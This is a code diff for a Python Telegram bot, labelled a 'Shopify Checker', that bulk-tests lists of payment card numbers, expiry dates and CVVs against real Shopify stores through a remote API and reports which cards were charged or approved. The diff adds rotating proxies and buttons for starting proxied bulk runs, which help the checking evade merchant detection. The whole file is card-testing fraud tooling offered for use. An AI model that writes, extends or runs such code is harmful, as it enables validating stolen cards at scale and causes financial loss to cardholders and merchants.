@@ -15,6 +15,7 @@ ADMIN_ID = 6566026385
 CREDIT = "@ZYELEO"
 
 API_FILE = "apis.json"
+PROXY_FILE = "proxies.json"
 SITE_FILE = "sites.json"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -31,10 +32,29 @@ def save_json(file, data):
     with open(file, 'w') as f: json.dump(data, f, indent=4)
 
 API_BASES = load_json(API_FILE, ["https://shopify-api-b6yt.onrender.com"])
+PROXIES = load_json(PROXY_FILE, [])
 SITES = load_json(SITE_FILE, ["yeezy.com", "skims.com"])
 
+api_idx = 0
+proxy_idx = 0
 site_idx = 0
-user_states = {} 
+
+user_states = {}
+pending_files = {} # Store file combos temporarily for inline buttons
+
+def get_next_api():
+    global api_idx
+    if not API_BASES: return None
+    url = API_BASES[api_idx % len(API_BASES)]
+    api_idx += 1
+    return url.rstrip("/")
+
+def get_next_proxy():
+    global proxy_idx
+    if not PROXIES: return None
+    p = PROXIES[proxy_idx % len(PROXIES)]
+    proxy_idx += 1
+    return p
 
 def get_next_site():
     global site_idx
@@ -59,8 +79,8 @@ def parse_combos(text):
     return list(combos)
 
 # ==================== MULTI-WORKER ENGINE ====================
-def api_worker(api_url, combo_queue, msg, progress_lock, stats):
-    """Each API gets its own worker thread. No proxies."""
+def api_worker(api_url, combo_queue, msg, progress_lock, stats, use_proxy):
+    """Each API gets its own worker thread."""
     while True:
         try:
             site, combo = combo_queue.get_nowait()
@@ -69,6 +89,11 @@ def api_worker(api_url, combo_queue, msg, progress_lock, stats):
             
         url = f"{api_url}/shopii"
         payload = {"site": site, "cc": combo}
+        
+        if use_proxy:
+            proxy = get_next_proxy()
+            if proxy:
+                payload["proxy"] = proxy
         
         try:
             r = requests.post(url, json=payload, timeout=45)
@@ -93,11 +118,10 @@ def api_worker(api_url, combo_queue, msg, progress_lock, stats):
                 
         combo_queue.task_done()
 
-def process_bulk_thread(msg, combos):
+def process_bulk_thread(msg, combos, use_proxy):
     total = len(combos)
     combo_queue = queue.Queue()
     
-    # Prepare combos
     for s, c in combos:
         if s == "RANDOM_SITE": combo_queue.put((get_next_site(), c))
         else: combo_queue.put((s, c))
@@ -109,17 +133,15 @@ def process_bulk_thread(msg, combos):
     progress_lock = threading.Lock()
     start_time = time.time()
     
-    # Start exactly one thread per API
     num_apis = len(API_BASES)
     threads = []
     for i in range(num_apis):
         api_url = API_BASES[i].rstrip("/")
-        t = threading.Thread(target=api_worker, args=(api_url, combo_queue, msg, progress_lock, stats))
+        t = threading.Thread(target=api_worker, args=(api_url, combo_queue, msg, progress_lock, stats, use_proxy))
         t.daemon = True
         t.start()
         threads.append(t)
         
-    # Progress monitor loop
     last_update = time.time()
     while any(t.is_alive() for t in threads):
         time.sleep(1)
@@ -132,8 +154,9 @@ def process_bulk_thread(msg, combos):
                 bar = "█" * int(pct / 10) + "░" * (10 - int(pct / 10))
                 elapsed = int(now - start_time)
                 
+                mode_str = "🌐 With Proxy" if use_proxy else "🚀 No Proxy"
                 text = (
-                    f"🚀 **Shopify Checker**\n\n"
+                    f"🚀 **Shopify Checker** ({mode_str})\n\n"
                     f"`[{bar}]` {pct}%\n"
                     f"📊 Checked: **{checked:,}** / {total:,}\n"
                     f"✅ Charged: **{stats['charged']:,}** | 🔥 Hits: **{stats['hits']:,}**\n"
@@ -144,7 +167,6 @@ def process_bulk_thread(msg, combos):
                 try: bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
                 except: pass
                 
-    # Final summary
     summary = (
         f"✅ **Done!**\n\n"
         f"Total: `{total:,}`\n"
@@ -166,10 +188,20 @@ def main_menu():
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
         types.InlineKeyboardButton("⚙️ APIs", callback_data="menu_api"),
+        types.InlineKeyboardButton("🌐 Proxies", callback_data="menu_proxy"),
         types.InlineKeyboardButton("🏪 Sites", callback_data="menu_site"),
         types.InlineKeyboardButton("📊 Stats", callback_data="menu_stats")
     )
     markup.add(types.InlineKeyboardButton("🛠 How to Use", callback_data="menu_help"))
+    return markup
+
+def proxy_menu():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("📤 Upload TXT", callback_data="proxy_upload"),
+        types.InlineKeyboardButton("🧹 Clear All", callback_data="proxy_clear")
+    )
+    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
     return markup
 
 def site_menu():
@@ -199,22 +231,22 @@ def start(message):
         "**Commands:**\n"
         "• `/chk cc|mm|yy|cvv` → Auto-pick a random saved site\n"
         "• `/chk site.com | cc|mm|yy|cvv` → Target a specific site\n"
-        "• Reply to `.txt` with `/chk` → Bulk check\n\n"
-        "⚙️ *Manage APIs and Sites below.*"
+        "• Reply to `.txt` with `/chk` → Bulk check (Choose Proxy/No Proxy)\n\n"
+        "⚙️ *Manage APIs, Proxies, and Sites below.*"
     )
     bot.reply_to(message, text, reply_markup=main_menu(), parse_mode='Markdown')
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    global SITES, API_BASES
+    global SITES, API_BASES, PROXIES
     
     data = call.data
-    if call.from_user.id != ADMIN_ID and "menu" not in data:
+    if call.from_user.id != ADMIN_ID and "menu" not in data and not data.startswith("start_"):
         bot.answer_callback_query(call.id, "❌ Admin Only!")
         return
 
     if data == "menu_main":
-        bot.edit_message_text("⚙️ **Main Dashboard**\nSelect an option below:", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
+        bot.edit_message_text("⚙️ **Main Dashboard**", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
     elif data == "menu_site":
         bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `{len(SITES)}`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
     elif data == "site_add":
@@ -228,7 +260,18 @@ def callback_query(call):
         save_json(SITE_FILE, SITES)
         bot.answer_callback_query(call.id, "✅ Sites Cleared!")
         bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `0`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
-    
+        
+    elif data == "menu_proxy":
+        bot.edit_message_text(f"🌐 **Proxy Manager**\nSaved Proxies: `{len(PROXIES)}`", call.message.chat.id, call.message.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
+    elif data == "proxy_upload":
+        user_states[call.from_user.id] = "awaiting_proxy_file"
+        bot.edit_message_text("📤 **Send `.txt` file** with proxies (one per line).", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_proxy")))
+    elif data == "proxy_clear":
+        PROXIES = []
+        save_json(PROXY_FILE, PROXIES)
+        bot.answer_callback_query(call.id, "✅ Proxies Cleared!")
+        bot.edit_message_text(f"🌐 **Proxy Manager**\nSaved Proxies: `0`", call.message.chat.id, call.message.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
+        
     elif data == "menu_api":
         bot.edit_message_text(f"⚙️ **API Manager**\nActive APIs: `{len(API_BASES)}`", call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
     elif data == "api_add":
@@ -237,9 +280,23 @@ def callback_query(call):
     elif data == "api_list":
         text = "📜 **Saved APIs:**\n\n" + "\n".join([f"{i+1}. `{a}`" for i, a in enumerate(API_BASES)]) if API_BASES else "❌ No APIs saved."
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
-    
+        
     elif data == "menu_stats":
-        bot.edit_message_text(f"📊 **Stats**\n\n⚙️ APIs: `{len(API_BASES)}`\n🏪 Sites: `{len(SITES)}`\n👷 Workers: `{len(API_BASES)}`", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
+        bot.edit_message_text(f"📊 **Stats**\n\n⚙️ APIs: `{len(API_BASES)}`\n🌐 Proxies: `{len(PROXIES)}`\n🏪 Sites: `{len(SITES)}`", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
+        
+    elif data.startswith("start_np_"):
+        file_id = data.replace("start_np_", "")
+        bot.answer_callback_query(call.id, "🚀 Starting without Proxy...")
+        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
+        t = threading.Thread(target=start_bulk_by_id, args=(call.message, file_id, False))
+        t.start()
+        
+    elif data.startswith("start_p_"):
+        file_id = data.replace("start_p_", "")
+        bot.answer_callback_query(call.id, "🌐 Starting with Proxy...")
+        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
+        t = threading.Thread(target=start_bulk_by_id, args=(call.message, file_id, True))
+        t.start()
 
 # ==================== MESSAGE HANDLERS ====================
 @bot.message_handler(content_types=['document'])
@@ -259,6 +316,24 @@ def handle_document(message):
                     added += 1
             save_json(SITE_FILE, SITES)
             bot.edit_message_text(f"✅ Added `{added}` sites.\nTotal: `{len(SITES)}`", msg.chat.id, msg.message_id, reply_markup=site_menu(), parse_mode='Markdown')
+        except Exception as e:
+            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
+        return
+
+    if user_states.get(uid) == "awaiting_proxy_file":
+        user_states[uid] = None
+        msg = bot.reply_to(message, "⏳ Parsing proxies...")
+        try:
+            file_info = bot.get_file(message.document.file_id)
+            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
+            lines = [line.strip() for line in content.splitlines() if line.strip()]
+            added = 0
+            for p in lines:
+                if p not in PROXIES:
+                    PROXIES.append(p)
+                    added += 1
+            save_json(PROXY_FILE, PROXIES)
+            bot.edit_message_text(f"✅ Added `{added}` proxies.\nTotal: `{len(PROXIES)}`", msg.chat.id, msg.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
         except Exception as e:
             bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
         return
@@ -289,30 +364,22 @@ def handle_chk(message):
         bot.reply_to(message, "❌ No APIs configured.")
         return
 
-    # BULK CHECK
+    # BULK CHECK - Show Inline Buttons
     if message.reply_to_message and message.reply_to_message.document:
         doc = message.reply_to_message.document
         if doc.file_size > 20 * 1024 * 1024:
             bot.reply_to(message, "❌ File too large (Max 20MB).")
             return
             
-        msg = bot.reply_to(message, "⏳ Downloading...", parse_mode='Markdown')
-        try:
-            file_info = bot.get_file(doc.file_id)
-            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
-            combos = parse_combos(content)
-            
-            if not combos:
-                bot.edit_message_text("❌ No valid combos found.", chat_id=msg.chat.id, message_id=msg.message_id)
-                return
-                
-            bot.edit_message_text(f"🚀 Checking **{len(combos):,}** combos using **{len(API_BASES)}** API workers (No Proxy)...", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
-            
-            t = threading.Thread(target=process_bulk_thread, args=(msg, combos))
-            t.start()
-            
-        except Exception as e:
-            bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)
+        # Store file info in callback data
+        file_id = doc.file_id
+        
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            types.InlineKeyboardButton("🚀 Start No Proxy", callback_data=f"start_np_{file_id}"),
+            types.InlineKeyboardButton("🌐 Start With Proxy", callback_data=f"start_p_{file_id}")
+        )
+        bot.reply_to(message, f"📁 **File Detected!**\n\nChoose how you want to check the combos:", reply_markup=markup, parse_mode='Markdown')
         return
 
     # SINGLE CHECK
@@ -326,7 +393,6 @@ def handle_chk(message):
         
     msg = bot.reply_to(message, f"🔍 Checking `{site}`...", parse_mode='Markdown')
     
-    # Single check grabs one API
     api = API_BASES[0].rstrip("/")
     url = f"{api}/shopii"
     try:
@@ -341,6 +407,24 @@ def handle_chk(message):
     emoji = "✅" if res in ("ORDER_PAID", "CHARGED") else ("🔥" if res in ("INSUFFICIENT_FUNDS", "APPROVED") else "❌")
     text = f"{emoji} **Status:** `{res}`\n🌐 Site: `{site}`\n💳 Card: `{combo}`\n💰 Price: `{price}`\n\n💠 {CREDIT}"
     bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
+
+def start_bulk_by_id(msg, file_id, use_proxy):
+    try:
+        file_info = bot.get_file(file_id)
+        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
+        combos = parse_combos(content)
+        
+        if not combos:
+            bot.edit_message_text("❌ No valid combos found.", chat_id=msg.chat.id, message_id=msg.message_id)
+            return
+            
+        mode_str = "With Proxy" if use_proxy else "No Proxy"
+        bot.edit_message_text(f"🚀 Checking **{len(combos):,}** combos using **{len(API_BASES)}** API workers ({mode_str})...", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
+        
+        process_bulk_thread(msg, combos, use_proxy)
+        
+    except Exception as e:
+        bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)
 
 if __name__ == "__main__":
     print("Starting Bot...")
